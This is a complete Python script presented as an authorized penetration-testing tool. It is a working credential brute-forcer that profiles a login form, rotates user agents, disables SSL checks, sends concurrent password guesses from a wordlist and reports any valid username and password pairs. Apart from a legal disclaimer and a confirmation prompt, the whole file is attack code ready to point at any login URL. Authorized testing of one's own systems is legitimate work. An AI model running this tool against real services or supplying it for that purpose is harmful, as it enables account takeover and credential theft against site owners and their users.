#!/usr/bin/env python3
"""
AUTHENTICATION TESTING TOOL - FOR AUTHORIZED PENETRATION TESTING ONLY
Professional-grade login brute-forcer for security assessments
"""

import asyncio
import aiohttp
import json
import random
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from queue import Queue, Empty
from typing import List, Dict, Any, Tuple, Optional
import argparse
import re
import requests
import urllib3
from dataclasses import dataclass
import hashlib
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
BOLD = '\033[1m'
RESET = '\033[0m'

@dataclass
class TestResult:
    username: str
    password: str
    success: bool
    reason: str
    response_code: int
    response_time: float
    response_length: int

class AuthTestingTool:
    def __init__(self):
        self.found_credentials = []
        self.tested_count = 0
        self.start_time = 0
        self.lock = threading.Lock()
        self.session_cookies = None
        self.csrf_tokens = {}
        
        # Professional user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ]
        
        # Common login field patterns
        self.username_fields = ['username', 'email', 'user', 'login', 'userid', 'usr', 'uname']
        self.password_fields = ['password', 'pass', 'pwd', 'passwd', 'psw']
        self.submit_fields = ['submit', 'login', 'btnLogin', 'commit', 'action']
        
        # Success indicators
        self.success_indicators = [
            'logout', 'dashboard', 'welcome', 'my account', 'profile', 'success',
            'redirecting', 'member area', 'control panel', 'admin'
        ]
        
        # Failure indicators
        self.failure_indicators = [
            'invalid', 'error', 'incorrect', 'failed', 'wrong', 'try again',
            'not found', 'denied', 'access denied', 'unauthorized'
        ]

    def print_banner(self):
        """Professional banner"""
        banner = f"""
{CYAN}{BOLD}
╔══════════════════════════════════════════════╗
║           AUTHENTICATION TESTING TOOL        ║
║           Professional Penetration Tool      ║
║                 v2.0 - 2024                  ║
╚══════════════════════════════════════════════╝
{RESET}
{BLUE}
Developed for authorized penetration testing
Use only on systems you own or have permission to test
{RESET}
"""
        print(banner)

    def print_legal_warning(self):
        """Professional legal disclaimer"""
        warning = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════╗
║                SECURITY NOTICE               ║
╚══════════════════════════════════════════════╝{RESET}

{YELLOW}{BOLD}INTENDED USE:{RESET}
• Authorized penetration testing
• Security research with permission  
• Educational purposes in controlled environments
• Testing your own systems and applications

{RED}{BOLD}PROHIBITED USE:{RESET}
• Unauthorized testing of third-party systems
• Malicious activities of any kind
• Violating laws or terms of service
• Testing without explicit written permission

{BLUE}By using this tool, you agree to:
1. Use only for authorized security testing
2. Obtain proper written permission
3. Follow responsible disclosure practices
4. Accept full legal responsibility for your actions{RESET}

"""
        print(warning)
        
        response = input(f"{RED}{BOLD}Confirm authorized use (yes/NO): {RESET}").strip().lower()
        if response != 'yes':
            print(f"{GREEN}Exiting. Use responsibly.{RESET}")
            sys.exit(0)

    async def advanced_reconnaissance(self, url: str) -> Dict[str, Any]:
        """Comprehensive reconnaissance of the target login form"""
        print(f"\n{CYAN}{BOLD}[RECONNAISSANCE PHASE]{RESET}")
        print(f"{CYAN}Gathering intelligence about the target...{RESET}")
        
        results = {
            'form_analysis': {},
            'security_headers': {},
            'technologies': {},
            'vulnerability_indicators': [],
            'recommendations': []
        }
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Analyze login page
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                
                async with session.get(url, headers=headers, ssl=False) as response:
                    html = await response.text()
                    
                    # Form analysis
                    forms = self._analyze_forms(html)
                    results['form_analysis'] = forms
                    
                    # Security headers
                    security_headers = self._check_security_headers(response.headers)
                    results['security_headers'] = security_headers
                    
                    # Technology detection
                    technologies = self._detect_technologies(html, response.headers)
                    results['technologies'] = technologies
                    
                    # Vulnerability indicators
                    vuln_indicators = self._check_vulnerability_indicators(html)
                    results['vulnerability_indicators'] = vuln_indicators
                    
                    # Print findings
                    self._print_recon_results(results)
                    
            except Exception as e:
                print(f"{RED}Reconnaissance error: {e}{RESET}")
                
        return results

    def _analyze_forms(self, html: str) -> Dict[str, Any]:
        """Analyze HTML forms for login functionality"""
        forms = {
            'login_forms': [],
            'fields_found': [],
            'csrf_tokens': [],
            'autocomplete_status': 'unknown'
        }
        
        # Find all forms
        form_matches = re.findall(r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL)
        
        for i, form_html in enumerate(form_matches):
            form_info = {
                'form_index': i,
                'action': re.search(r'action=[\'"]([^\'"]*)[\'"]', form_html),
                'method': re.search(r'method=[\'"]([^\'"]*)[\'"]', form_html),
                'fields': re.findall(r'<input[^>]*name=[\'"]([^\'"]*)[\'"][^>]*>', form_html)
            }
            forms['login_forms'].append(form_info)
            forms['fields_found'].extend(form_info['fields'])
        
        # Check for CSRF tokens
        csrf_patterns = [
            r'name=[\'"]csrf[^>]*value=[\'"]([^\'"]*)[\'"]',
            r'name=[\'"]authenticity_token[^>]*value=[\'"]([^\'"]*)[\'"]',
            r'name=[\'"]_token[^>]*value=[\'"]([^\'"]*)[\'"]'
        ]
        
        for pattern in csrf_patterns:
            tokens = re.findall(pattern, html, re.IGNORECASE)
            forms['csrf_tokens'].extend(tokens)
        
        # Check autocomplete
        if 'autocomplete=off' in html.lower():
            forms['autocomplete_status'] = 'disabled'
        else:
            forms['autocomplete_status'] = 'enabled'
            
        return forms

    def _check_security_headers(self, headers) -> Dict[str, str]:
        """Check for security-related HTTP headers"""
        security_headers = {}
        important_headers = [
            'content-security-policy', 'x-frame-options', 'x-content-type-options',
            'strict-transport-security', 'x-xss-protection'
        ]
        
        for header in important_headers:
            security_headers[header] = headers.get(header, 'NOT SET')
            
        return security_headers

    def _detect_technologies(self, html: str, headers) -> Dict[str, List[str]]:
        """Detect web technologies and frameworks"""
        technologies = {
            'frameworks': [],
            'servers': [],
            'languages': []
        }
        
        # Framework detection
        if 'wp-content' in html or 'wordpress' in html.lower():
            technologies['frameworks'].append('WordPress')
        if 'drupal' in html.lower():
            technologies['frameworks'].append('Drupal')
        if 'laravel' in html.lower():
            technologies['frameworks'].append('Laravel')
            
        # Server detection
        server = headers.get('server', '')
        if server:
            technologies['servers'].append(server)
            
        # Language detection
        if 'asp.net' in html.lower() or '__viewstate' in html:
            technologies['languages'].append('ASP.NET')
        if 'php' in html.lower() or '<?php' in html:
            technologies['languages'].append('PHP')
        if 'jsp' in html.lower() or 'java' in html.lower():
            technologies['languages'].append('Java')
            
        return technologies

    def _check_vulnerability_indicators(self, html: str) -> List[str]:
        """Check for potential vulnerability indicators"""
        indicators = []
        
        # Common vulnerability patterns
        if 'debug=true' in html.lower():
            indicators.append('Debug mode enabled')
        if 'test' in html.lower() and 'environment' in html.lower():
            indicators.append('Test environment detected')
        if 'version' in html.lower() and any(char.isdigit() for char in html):
            indicators.append('Version information exposed')
        if 'error' in html.lower() and 'stack trace' in html.lower():
            indicators.append('Stack traces exposed')
            
        return indicators

    def _print_recon_results(self, results: Dict[str, Any]):
        """Print reconnaissance results"""
        print(f"\n{BLUE}{BOLD}[RECONNAISSANCE RESULTS]{RESET}")
        
        # Forms
        forms = results['form_analysis']
        print(f"{CYAN}Forms Found: {len(forms['login_forms'])}{RESET}")
        for form in forms['login_forms']:
            print(f"  Fields: {', '.join(form['fields'])}")
        
        # Security Headers
        headers = results['security_headers']
        print(f"{CYAN}Security Headers:{RESET}")
        for header, value in headers.items():
            status = f"{GREEN}PRESENT{RESET}" if value != 'NOT SET' else f"{RED}MISSING{RESET}"
            print(f"  {header}: {status}")
        
        # Technologies
        tech = results['technologies']
        if tech['frameworks']:
            print(f"{CYAN}Frameworks: {', '.join(tech['frameworks'])}{RESET}")
        if tech['servers']:
            print(f"{CYAN}Servers: {', '.join(tech['servers'])}{RESET}")
        if tech['languages']:
            print(f"{CYAN}Languages: {', '.join(tech['languages'])}{RESET}")
        
        # Vulnerability Indicators
        vulns = results['vulnerability_indicators']
        if vulns:
            print(f"{RED}Vulnerability Indicators:{RESET}")
            for vuln in vulns:
                print(f"  {RED}• {vuln}{RESET}")

    async def test_login(self, session: aiohttp.ClientSession, url: str, username: str, 
                        password: str, config: Dict[str, Any]) -> TestResult:
        """Test a single login with advanced detection"""
        start_time = time.time()
        
        # Prepare request data
        data = self._build_request_data(username, password, config)
        headers = self._build_headers(config)
        
        try:
            async with session.post(url, data=data, headers=headers, ssl=False, allow_redirects=True) as response:
                response_text = await response.text()
                response_time = time.time() - start_time
                
                # Analyze response
                success, reason = self._analyze_response(response, response_text, config)
                
                return TestResult(
                    username=username,
                    password=password,
                    success=success,
                    reason=reason,
                    response_code=response.status,
                    response_time=response_time,
                    response_length=len(response_text)
                )
                
        except Exception as e:
            return TestResult(
                username=username,
                password=password,
                success=False,
                reason=f"Request failed: {str(e)}",
                response_code=0,
                response_time=time.time() - start_time,
                response_length=0
            )

    def _build_request_data(self, username: str, password: str, config: Dict[str, Any]) -> Dict[str, str]:
        """Build the request data with various field combinations"""
        data = {}
        
        # Use custom fields if provided
        if config.get('username_field') and config.get('password_field'):
            data[config['username_field']] = username
            data[config['password_field']] = password
        else:
            # Try common combinations
            data['username'] = username
            data['password'] = password
        
        # Add CSRF token if available
        if config.get('csrf_token'):
            data['csrf_token'] = config['csrf_token']
        
        # Add submit button if needed
        if config.get('submit_field'):
            data[config['submit_field']] = 'Login'
        
        return data

    def _build_headers(self, config: Dict[str, Any]) -> Dict[str, str]:
        """Build request headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        # Add custom headers if provided
        if config.get('custom_headers'):
            headers.update(config['custom_headers'])
            
        return headers

    def _analyze_response(self, response, response_text: str, config: Dict[str, Any]) -> Tuple[bool, str]:
        """Analyze login response with multiple detection methods"""
        final_url = str(response.url)
        
        # 1. Check custom success indicator
        if config.get('success_string') and config['success_string'] in response_text:
            return True, "Custom success string detected"
        
        # 2. Check custom failure indicator
        if config.get('failure_string') and config['failure_string'] in response_text:
            return False, "Custom failure string detected"
        
        # 3. Check HTTP status code
        if response.status in [200, 302, 303]:
            # 4. Check URL redirection
            if config.get('login_url') not in final_url:
                return True, "Redirected from login page"
            
            # 5. Check content patterns
            if any(indicator in response_text.lower() for indicator in self.success_indicators):
                return True, "Success pattern detected"
            
            if any(indicator in response_text.lower() for indicator in self.failure_indicators):
                return False, "Failure pattern detected"
        
        # 6. Check response length changes (heuristic)
        expected_failure_len = config.get('expected_failure_length')
        if expected_failure_len and abs(len(response_text) - expected_failure_len) > 100:
            return True, "Response length differs significantly from failed login"
        
        return False, "Unable to determine login status"

    async def execute_test(self, url: str, username: str, passwords: List[str], config: Dict[str, Any]):
        """Execute the authentication test"""
        print(f"\n{YELLOW}{BOLD}[TESTING PHASE]{RESET}")
        print(f"{YELLOW}Target: {url}{RESET}")
        print(f"{YELLOW}Username: {username}{RESET}")
        print(f"{YELLOW}Total passwords: {len(passwords)}{RESET}")
        print(f"{YELLOW}Concurrent workers: {config.get('workers', 3)}{RESET}")
        print(f"{YELLOW}Request delay: {config.get('delay', 1)}s{RESET}\n")
        
        connector = aiohttp.TCPConnector(limit=config.get('workers', 3), ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(config.get('workers', 3))
            
            async def bounded_test(password: str) -> TestResult:
                async with semaphore:
                    if config.get('delay', 0) > 0:
                        await asyncio.sleep(config.get('delay', 0))
                    return await self.test_login(session, url, username, password, config)
            
            tasks = [bounded_test(pwd.strip()) for pwd in passwords if pwd.strip()]
            results = await asyncio.gather(*tasks)
            
            # Process results
            for result in results:
                with self.lock:
                    self.tested_count += 1
                    if result.success:
                        self.found_credentials.append((result.username, result.password))
                        print(f'\n{GREEN}{BOLD}[VALID] {result.username}:{result.password}{RESET}')
                        print(f'{BLUE}    Code: {result.response_code} | Time: {result.response_time:.2f}s | Reason: {result.reason}{RESET}')
                    
                    # Print progress
                    if self.tested_count % 10 == 0:
                        self._print_progress()

    def _print_progress(self):
        """Print testing progress"""
        elapsed = time.time() - self.start_time
        speed = self.tested_count / elapsed if elapsed > 0 else 0
        
        print(f'\r{CYAN}[Progress]{RESET} '
              f'Tested: {self.tested_count} | '
              f'Speed: {speed:.1f}/sec | '
              f'Valid: {GREEN}{len(self.found_credentials)}{RESET} | '
              f'Time: {elapsed:.1f}s', 
              end='', flush=True)

    def generate_report(self):
        """Generate professional test report"""
        total_time = time.time() - self.start_time
        
        report = f"""
{CYAN}{BOLD}
╔══════════════════════════════════════════════╗
║               TESTING REPORT                 ║
╚══════════════════════════════════════════════╝{RESET}

{BLUE}Test Summary:{RESET}
• Total requests: {self.tested_count}
• Testing duration: {total_time:.1f} seconds
• Average speed: {self.tested_count/total_time:.1f} requests/second
• Valid credentials found: {len(self.found_credentials)}

{BLUE}Results:{RESET}
"""
        
        if self.found_credentials:
            for username, password in self.found_credentials:
                report += f"{GREEN}• {username}:{password}{RESET}\n"
        else:
            report += f"{YELLOW}• No valid credentials found{RESET}\n"
        
        report += f"""
{BLUE}Recommendations:{RESET}
• Review authentication mechanisms
• Implement account lockout policies
• Consider multi-factor authentication
• Monitor for brute force attempts
• Use strong password policies
"""
        print(report)

    def load_passwords(self, password_file: str) -> List[str]:
        """Load passwords from file with validation"""
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            if not passwords:
                raise ValueError("No passwords found in file")
            
            # Remove duplicates while preserving order
            seen = set()
            unique_passwords = []
            for pwd in passwords:
                if pwd not in seen:
                    seen.add(pwd)
                    unique_passwords.append(pwd)
            
            print(f"{GREEN}[✓] Loaded {len(unique_passwords)} unique passwords{RESET}")
            return unique_passwords
            
        except FileNotFoundError:
            raise FileNotFoundError(f"Password file not found: {password_file}")
        except Exception as e:
            raise Exception(f"Error reading password file: {e}")

def main():
    tool = AuthTestingTool()
    
    try:
        tool.print_banner()
        tool.print_legal_warning()
        
        # Get test parameters
        print(f"{CYAN}{BOLD}[TEST CONFIGURATION]{RESET}")
        
        url = input(f'{CYAN}Login URL: {RESET}').strip()
        username = input(f'{CYAN}Username to test: {RESET}').strip()
        password_file = input(f'{CYAN}Password file path: {RESET}').strip()
        
        # Advanced options
        print(f"\n{BLUE}[Advanced Options]{RESET}")
        username_field = input(f'{CYAN}Username field (Enter for auto-detect): {RESET}').strip() or None
        password_field = input(f'{CYAN}Password field (Enter for auto-detect): {RESET}').strip() or None
        success_string = input(f'{CYAN}Success indicator text (optional): {RESET}').strip() or None
        failure_string = input(f'{CYAN}Failure indicator text (optional): {RESET}').strip() or None
        
        workers = input(f'{CYAN}Concurrent workers (default 3): {RESET}').strip()
        workers = int(workers) if workers else 3
        
        delay = input(f'{CYAN}Delay between requests in seconds (default 1): {RESET}').strip()
        delay = float(delay) if delay else 1.0
        
        # Build config
        config = {
            'login_url': url,
            'username_field': username_field,
            'password_field': password_field,
            'success_string': success_string,
            'failure_string': failure_string,
            'workers': workers,
            'delay': delay
        }
        
        # Load passwords
        passwords = tool.load_passwords(password_file)
        
        # Run reconnaissance
        run_recon = input(f'\n{CYAN}Run reconnaissance first? (y/N): {RESET}').strip().lower()
        if run_recon == 'y':
            asyncio.run(tool.advanced_reconnaissance(url))
        
        # Confirm test start
        confirm = input(f'\n{RED}{BOLD}Start authentication testing? (yes/NO): {RESET}').strip().lower()
        if confirm != 'yes':
            print(f"{GREEN}Test cancelled.{RESET}")
            return
        
        # Execute test
        tool.start_time = time.time()
        asyncio.run(tool.execute_test(url, username, passwords, config))
        
        # Generate report
        tool.generate_report()
        
    except KeyboardInterrupt:
        print(f'\n{YELLOW}[!] Testing interrupted by user{RESET}')
    except Exception as e:
        print(f'\n{RED}[!] Error: {e}{RESET}')
        sys.exit(1)

if __name__ == "__main__":
    main()
